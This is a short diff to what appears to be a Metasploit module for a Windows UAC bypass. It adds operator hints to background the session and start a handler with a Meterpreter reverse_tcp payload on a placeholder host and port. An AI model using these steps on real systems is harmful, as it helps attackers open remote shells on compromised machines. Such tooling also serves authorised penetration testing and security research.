@@ -269,6 +269,9 @@ end
 
     # close channel when done
     print_status("UAC-RCE Credits: enigma0x3 + @mattifestation")
+    print_status("execute: background")
+    print_status("execute: handler -P PORT -H HOST -p windows/meterpreter/reverse_tcp")
+    print_status("execute: exploit")
     print_line("")
     r.channel.close
     r.close
